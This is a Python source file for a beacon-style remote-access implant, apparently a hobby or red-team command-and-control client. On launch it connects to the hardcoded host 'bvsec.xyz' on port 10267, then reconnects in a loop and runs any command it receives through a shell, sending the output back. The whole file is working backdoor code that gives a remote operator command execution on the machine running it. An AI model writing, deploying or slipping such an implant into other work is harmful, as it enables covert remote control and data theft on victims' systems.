#!/usr/bin/python3

import socket,subprocess,time,string
#import rsa

class Beacon:
   #Contains client side behavior and state

   __slots__ = ["sock","running","server_ip","server_port","debugging","pubkey","privatekey"]

   def __init__(self,server_ip,server_port):
      self.running = False
      self.server_ip = server_ip
      self.server_port = server_port
      self.debugging = True
      #self.pubkey,self.privatekey = rsa.newkeys(2048)
      #print(self.pubkey,self.privatekey)

   def connect(self):
      try:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.connect((self.server_ip,self.server_port))
         #pubkey_pem = self.pubkey.save_pkcs1(format='PEM')
         #self.sock.sendall(pubkey_pem)
      except:
         self.sock.close()

   def run_command(self,command):
      try:
         cmd = command.split(" ")
         ps = subprocess.run(cmd, shell=True, capture_output=True,check=True)
         if self.debugging == True:
            print("Sending:" ,ps.stdout)
         if ps.stdout != None and ps.stdout != b'':
            self.sock.send(ps.stdout)
         else:
            self.sock.send("SUCCESS".encode())
      except Exception as e:
                     error_msg = f"ERROR: {str(e)}"
                     if self.debugging == True:
                        print(error_msg)
                     self.sock.send(error_msg.encode())

   def start(self):
      self.running = True
      while self.running:
            self.connect()
            if self.sock:
                self.run()
            else:
                time.sleep(10)
   
   def run(self):
      try:
         while self.running:
               self.sock.settimeout(5)
               try:
                  data = self.sock.recv(4096).decode()
                  if not data:
                     # If no data is received, break the loop
                     break
                  if self.debugging == True:
                     print("Received:",data)
                  split = data.split("|")
                  if split[0] == "cmd":
                     self.run_command(split[1])
                  elif split[0] == "quit":
                     self.terminate()
                  else:
                     self.sock.send("Unknown Error".encode())
               except socket.timeout:
                  continue
      except:
         self.start()
            
   def terminate(self):
      self.running = False
      if self.sock:
         self.sock.close()

def main():
   beacon = Beacon("bvsec.xyz",10267)
   beacon.start()

main()
